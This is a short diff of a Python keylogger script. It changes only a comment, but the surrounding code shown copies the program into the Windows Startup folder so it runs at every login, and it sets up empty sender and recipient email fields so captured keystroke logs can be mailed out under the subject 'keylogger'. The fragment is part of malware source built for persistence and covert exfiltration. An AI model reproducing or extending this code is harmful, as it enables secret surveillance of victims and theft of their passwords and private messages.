@@ -19,7 +19,7 @@ username = os.getlogin()
 if os.path.isfile('C:\\Users\\'+username+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + ofx[-1]) == False:
 	shutil.copy2(ofx[-1], 'C:\\Users\\'+username+'\\Appdata\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' + ofx[-1])
 
-#enter email which will get messages with logs 2 times
+#enter email which will get messages with logs into sender_email and rec_email
 sender_email = ""
 rec_email = ""
 subject = "keylogger"
